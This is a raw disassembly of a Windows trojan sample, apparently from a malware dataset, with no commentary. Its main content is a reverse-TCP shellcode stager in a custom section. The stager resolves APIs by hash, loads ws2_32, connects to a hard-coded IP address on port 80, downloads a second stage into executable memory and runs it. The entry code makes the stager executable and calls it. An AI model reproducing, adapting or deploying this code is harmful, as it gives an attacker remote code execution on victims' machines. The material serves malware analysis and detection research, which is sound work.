
malware_samples/trojan/14c2fb8615605b1cf4477250007701c7ec47da6e898540fe719d09c28525031c.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 38          	sub    $0x38,%rsp
   140001004:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140001009:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   14000100f:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001014:	48 8d 0d e5 1f 00 00 	lea    0x1fe5(%rip),%rcx        # 0x140003000
   14000101b:	ff 15 df 0f 00 00    	call   *0xfdf(%rip)        # 0x140002000
   140001021:	48 8d 05 d8 1f 00 00 	lea    0x1fd8(%rip),%rax        # 0x140003000
   140001028:	ff d0                	call   *%rax
   14000102a:	90                   	nop
   14000102b:	33 c0                	xor    %eax,%eax
   14000102d:	48 83 c4 38          	add    $0x38,%rsp
   140001031:	c3                   	ret

Disassembly of section .ywew:

0000000140005000 <.ywew>:
   140005000:	fc                   	cld
   140005001:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   140005005:	e8 cc 00 00 00       	call   0x1400050d6
   14000500a:	41 51                	push   %r9
   14000500c:	41 50                	push   %r8
   14000500e:	52                   	push   %rdx
   14000500f:	51                   	push   %rcx
   140005010:	48 31 d2             	xor    %rdx,%rdx
   140005013:	56                   	push   %rsi
   140005014:	65 48 8b 52 60       	mov    %gs:0x60(%rdx),%rdx
   140005019:	48 8b 52 18          	mov    0x18(%rdx),%rdx
   14000501d:	48 8b 52 20          	mov    0x20(%rdx),%rdx
   140005021:	4d 31 c9             	xor    %r9,%r9
   140005024:	48 0f b7 4a 4a       	movzwq 0x4a(%rdx),%rcx
   140005029:	48 8b 72 50          	mov    0x50(%rdx),%rsi
   14000502d:	48 31 c0             	xor    %rax,%rax
   140005030:	ac                   	lods   (%rsi),%al
   140005031:	3c 61                	cmp    $0x61,%al
   140005033:	7c 02                	jl     0x140005037
   140005035:	2c 20                	sub    $0x20,%al
   140005037:	41 c1 c9 0d          	ror    $0xd,%r9d
   14000503b:	41 01 c1             	add    %eax,%r9d
   14000503e:	e2 ed                	loop   0x14000502d
   140005040:	52                   	push   %rdx
   140005041:	48 8b 52 20          	mov    0x20(%rdx),%rdx
   140005045:	41 51                	push   %r9
   140005047:	8b 42 3c             	mov    0x3c(%rdx),%eax
   14000504a:	48 01 d0             	add    %rdx,%rax
   14000504d:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   140005053:	0f 85 72 00 00 00    	jne    0x1400050cb
   140005059:	8b 80 88 00 00 00    	mov    0x88(%rax),%eax
   14000505f:	48 85 c0             	test   %rax,%rax
   140005062:	74 67                	je     0x1400050cb
   140005064:	48 01 d0             	add    %rdx,%rax
   140005067:	50                   	push   %rax
   140005068:	44 8b 40 20          	mov    0x20(%rax),%r8d
   14000506c:	8b 48 18             	mov    0x18(%rax),%ecx
   14000506f:	49 01 d0             	add    %rdx,%r8
   140005072:	e3 56                	jrcxz  0x1400050ca
   140005074:	48 ff c9             	dec    %rcx
   140005077:	41 8b 34 88          	mov    (%r8,%rcx,4),%esi
   14000507b:	48 01 d6             	add    %rdx,%rsi
   14000507e:	4d 31 c9             	xor    %r9,%r9
   140005081:	48 31 c0             	xor    %rax,%rax
   140005084:	41 c1 c9 0d          	ror    $0xd,%r9d
   140005088:	ac                   	lods   (%rsi),%al
   140005089:	41 01 c1             	add    %eax,%r9d
   14000508c:	38 e0                	cmp    %ah,%al
   14000508e:	75 f1                	jne    0x140005081
   140005090:	4c 03 4c 24 08       	add    0x8(%rsp),%r9
   140005095:	45 39 d1             	cmp    %r10d,%r9d
   140005098:	75 d8                	jne    0x140005072
   14000509a:	58                   	pop    %rax
   14000509b:	44 8b 40 24          	mov    0x24(%rax),%r8d
   14000509f:	49 01 d0             	add    %rdx,%r8
   1400050a2:	66 41 8b 0c 48       	mov    (%r8,%rcx,2),%cx
   1400050a7:	44 8b 40 1c          	mov    0x1c(%rax),%r8d
   1400050ab:	49 01 d0             	add    %rdx,%r8
   1400050ae:	41 8b 04 88          	mov    (%r8,%rcx,4),%eax
   1400050b2:	41 58                	pop    %r8
   1400050b4:	48 01 d0             	add    %rdx,%rax
   1400050b7:	41 58                	pop    %r8
   1400050b9:	5e                   	pop    %rsi
   1400050ba:	59                   	pop    %rcx
   1400050bb:	5a                   	pop    %rdx
   1400050bc:	41 58                	pop    %r8
   1400050be:	41 59                	pop    %r9
   1400050c0:	41 5a                	pop    %r10
   1400050c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400050c6:	41 52                	push   %r10
   1400050c8:	ff e0                	jmp    *%rax
   1400050ca:	58                   	pop    %rax
   1400050cb:	41 59                	pop    %r9
   1400050cd:	5a                   	pop    %rdx
   1400050ce:	48 8b 12             	mov    (%rdx),%rdx
   1400050d1:	e9 4b ff ff ff       	jmp    0x140005021
   1400050d6:	5d                   	pop    %rbp
   1400050d7:	49 be 77 73 32 5f 33 	movabs $0x32335f327377,%r14
   1400050de:	32 00 00 
   1400050e1:	41 56                	push   %r14
   1400050e3:	49 89 e6             	mov    %rsp,%r14
   1400050e6:	48 81 ec a0 01 00 00 	sub    $0x1a0,%rsp
   1400050ed:	49 89 e5             	mov    %rsp,%r13
   1400050f0:	49 bc 02 00 00 50 40 	movabs $0xca50344050000002,%r12
   1400050f7:	34 50 ca 
   1400050fa:	41 54                	push   %r12
   1400050fc:	49 89 e4             	mov    %rsp,%r12
   1400050ff:	4c 89 f1             	mov    %r14,%rcx
   140005102:	41 ba 4c 77 26 07    	mov    $0x726774c,%r10d
   140005108:	ff d5                	call   *%rbp
   14000510a:	4c 89 ea             	mov    %r13,%rdx
   14000510d:	68 01 01 00 00       	push   $0x101
   140005112:	59                   	pop    %rcx
   140005113:	41 ba 29 80 6b 00    	mov    $0x6b8029,%r10d
   140005119:	ff d5                	call   *%rbp
   14000511b:	6a 0a                	push   $0xa
   14000511d:	41 5e                	pop    %r14
   14000511f:	50                   	push   %rax
   140005120:	50                   	push   %rax
   140005121:	4d 31 c9             	xor    %r9,%r9
   140005124:	4d 31 c0             	xor    %r8,%r8
   140005127:	48 ff c0             	inc    %rax
   14000512a:	48 89 c2             	mov    %rax,%rdx
   14000512d:	48 ff c0             	inc    %rax
   140005130:	48 89 c1             	mov    %rax,%rcx
   140005133:	41 ba ea 0f df e0    	mov    $0xe0df0fea,%r10d
   140005139:	ff d5                	call   *%rbp
   14000513b:	48 89 c7             	mov    %rax,%rdi
   14000513e:	6a 10                	push   $0x10
   140005140:	41 58                	pop    %r8
   140005142:	4c 89 e2             	mov    %r12,%rdx
   140005145:	48 89 f9             	mov    %rdi,%rcx
   140005148:	41 ba 99 a5 74 61    	mov    $0x6174a599,%r10d
   14000514e:	ff d5                	call   *%rbp
   140005150:	85 c0                	test   %eax,%eax
   140005152:	74 0a                	je     0x14000515e
   140005154:	49 ff ce             	dec    %r14
   140005157:	75 e5                	jne    0x14000513e
   140005159:	e8 93 00 00 00       	call   0x1400051f1
   14000515e:	48 83 ec 10          	sub    $0x10,%rsp
   140005162:	48 89 e2             	mov    %rsp,%rdx
   140005165:	4d 31 c9             	xor    %r9,%r9
   140005168:	6a 04                	push   $0x4
   14000516a:	41 58                	pop    %r8
   14000516c:	48 89 f9             	mov    %rdi,%rcx
   14000516f:	41 ba 02 d9 c8 5f    	mov    $0x5fc8d902,%r10d
   140005175:	ff d5                	call   *%rbp
   140005177:	83 f8 00             	cmp    $0x0,%eax
   14000517a:	7e 55                	jle    0x1400051d1
   14000517c:	48 83 c4 20          	add    $0x20,%rsp
   140005180:	5e                   	pop    %rsi
   140005181:	89 f6                	mov    %esi,%esi
   140005183:	6a 40                	push   $0x40
   140005185:	41 59                	pop    %r9
   140005187:	68 00 10 00 00       	push   $0x1000
   14000518c:	41 58                	pop    %r8
   14000518e:	48 89 f2             	mov    %rsi,%rdx
   140005191:	48 31 c9             	xor    %rcx,%rcx
   140005194:	41 ba 58 a4 53 e5    	mov    $0xe553a458,%r10d
   14000519a:	ff d5                	call   *%rbp
   14000519c:	48 89 c3             	mov    %rax,%rbx
   14000519f:	49 89 c7             	mov    %rax,%r15
   1400051a2:	4d 31 c9             	xor    %r9,%r9
   1400051a5:	49 89 f0             	mov    %rsi,%r8
   1400051a8:	48 89 da             	mov    %rbx,%rdx
   1400051ab:	48 89 f9             	mov    %rdi,%rcx
   1400051ae:	41 ba 02 d9 c8 5f    	mov    $0x5fc8d902,%r10d
   1400051b4:	ff d5                	call   *%rbp
   1400051b6:	83 f8 00             	cmp    $0x0,%eax
   1400051b9:	7d 28                	jge    0x1400051e3
   1400051bb:	58                   	pop    %rax
   1400051bc:	41 57                	push   %r15
   1400051be:	59                   	pop    %rcx
   1400051bf:	68 00 40 00 00       	push   $0x4000
   1400051c4:	41 58                	pop    %r8
   1400051c6:	6a 00                	push   $0x0
   1400051c8:	5a                   	pop    %rdx
   1400051c9:	41 ba 0b 2f 0f 30    	mov    $0x300f2f0b,%r10d
   1400051cf:	ff d5                	call   *%rbp
   1400051d1:	57                   	push   %rdi
   1400051d2:	59                   	pop    %rcx
   1400051d3:	41 ba 75 6e 4d 61    	mov    $0x614d6e75,%r10d
   1400051d9:	ff d5                	call   *%rbp
   1400051db:	49 ff ce             	dec    %r14
   1400051de:	e9 3c ff ff ff       	jmp    0x14000511f
   1400051e3:	48 01 c3             	add    %rax,%rbx
   1400051e6:	48 29 c6             	sub    %rax,%rsi
   1400051e9:	48 85 f6             	test   %rsi,%rsi
   1400051ec:	75 b4                	jne    0x1400051a2
   1400051ee:	41 ff e7             	jmp    *%r15
   1400051f1:	58                   	pop    %rax
   1400051f2:	6a 00                	push   $0x0
   1400051f4:	59                   	pop    %rcx
   1400051f5:	49 c7 c2 f0 b5 a2 56 	mov    $0x56a2b5f0,%r10
   1400051fc:	ff d5                	call   *%rbp
   1400051fe:	00 00                	add    %al,(%rax)
   140005200:	28 52 00             	sub    %dl,0x0(%rdx)
   140005203:	00 00                	add    %al,(%rax)
   140005205:	00 00                	add    %al,(%rax)
   140005207:	00 ff                	add    %bh,%bh
   140005209:	ff                   	(bad)
   14000520a:	ff                   	(bad)
   14000520b:	ff                   	(bad)
   14000520c:	38 52 00             	cmp    %dl,0x0(%rdx)
   14000520f:	00 00                	add    %al,(%rax)
   140005211:	20 00                	and    %al,(%rax)
	...
   140005227:	00 46 52             	add    %al,0x52(%rsi)
	...
   140005236:	00 00                	add    %al,(%rax)
   140005238:	4b                   	rex.WXB
   140005239:	45 52                	rex.RB push %r10
   14000523b:	4e                   	rex.WRX
   14000523c:	45                   	rex.RB
   14000523d:	4c 33 32             	xor    (%rdx),%r14
   140005240:	2e 64 6c             	cs fs insb (%dx),(%rdi)
   140005243:	6c                   	insb   (%dx),(%rdi)
   140005244:	00 00                	add    %al,(%rax)
   140005246:	19 06                	sbb    %eax,(%rsi)
   140005248:	56                   	push   %rsi
   140005249:	69 72 74 75 61 6c 50 	imul   $0x506c6175,0x74(%rdx),%esi
   140005250:	72 6f                	jb     0x1400052c1
   140005252:	74 65                	je     0x1400052b9
   140005254:	63 74 00 00          	movsxd 0x0(%rax,%rax,1),%esi
   140005258:	00 00                	add    %al,(%rax)
   14000525a:	00 00                	add    %al,(%rax)
   14000525c:	08 00                	or     %al,(%rax)
	...
